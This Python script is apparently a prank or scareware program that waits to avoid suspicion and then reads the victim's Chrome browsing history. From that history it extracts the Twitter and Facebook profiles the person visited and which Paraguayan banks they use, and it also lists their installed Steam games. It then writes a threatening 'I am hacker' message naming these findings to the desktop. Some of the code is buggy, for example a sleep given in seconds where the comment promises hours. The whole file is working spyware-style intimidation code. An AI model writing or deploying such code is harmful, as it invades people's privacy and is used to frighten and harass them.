import os
import re
from pathlib import Path
import sqlite3
from random import randrange
from shutil import copyfile
from time import sleep
import glob
HACKER_FILE_NAME = "For you.txt"


def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    # We will wait between 3 and 4 hours
    n_hours = randrange(3, 4)
    # 3600
    print("sleeping for {} hours".format(n_hours))
    sleep(n_hours)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Desktop/" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hi, i am hacker, and i have entered your system\n")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls

        except sqlite3.OperationalError:
            print("History inaccessible, retrying in 3 seconds...")
            sleep(3)


def check_twitter_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:100]:
        results = re.findall(r"https://twitter.com/(\w+)$", item[2])
        if results and results[0] not in ["notification", "home"]:
            profiles_visited.append(results[0])
    if len(profiles_visited) > 0:
        hacker_file.write("I have seen that you have visited twitter profiles {}, interesting..."
                          .format(", ".join(profiles_visited)))


def check_facebook_profiles_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    number = -1
    for item in chrome_history:
        number += 1
        results = re.findall(r"https://m\.facebook\.com/[A-Za-z]+(?:[.a-zA-Z\d]+)?(?:"
                             r"[.a-zA-Z\d]+)?$|.+refid=\d+&_ft_=encrypted_tracking_data\.0AY|\?id=\d+", item[2])
        if results and chrome_history[number][0] not in ['Facebook', 'Notificaciones', 'Fotos de la biografía']:
            profiles_visited.append(chrome_history[number][0])
    hacker_file.write("\nI have seen that you have visited facebook profiles {}, interesting..."
                      .format(", ".join(profiles_visited)))


def check_bank_acound(hacker_file, chrome_history):
    re_banks = re.compile(r"(www\.(sudameris)|(bancop)|(rio)|(bnf\.gov)|(interfisa)|(bancognb)|(familiar)|("
                          r"bancontinental)|(bancobasa)|(bancoatlas)\.com\.py)|(www\.visionbanco\.com)")

    for item in chrome_history:
        # his_bank = re.search(re_banks, item[2])
        his_bank = re_banks.search(item[2])

        if his_bank:
            hacker_file.write("\nI have seen you have account in {}".format(his_bank.string))
            break


def check_steam_games(hacker_file):
    games = []
    steam_path = "c:\\Program Files (x86)\\Steam\\Steamapps\\common\\"
    files = glob.glob(steam_path)
    files_descending = sorted(files, key=os.path.getmtime, reverse=True)

    for path_descending in files_descending:
        games.append(path_descending.split("\\")[-1])
    if len(games) > 0:
        hacker_file.write("I have seen that you have played {}... lately.".format(",".join(games[:3])))


def main():
    # we wait not to raise suspicion
    delay_action()
    # We calculate the path of the user from windows
    user_path = get_user_path()
    # We collect your Google Chrome history, when it is possible...
    chrome_history = get_chrome_history(user_path)
    # We create a file on the desktop
    hacker_file = create_hacker_file(user_path)
    # Writing horror message
    check_twitter_profiles_and_scare_user(hacker_file, chrome_history)
    check_facebook_profiles_and_scare_user(hacker_file, chrome_history)
    check_bank_acound(hacker_file, chrome_history)
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()
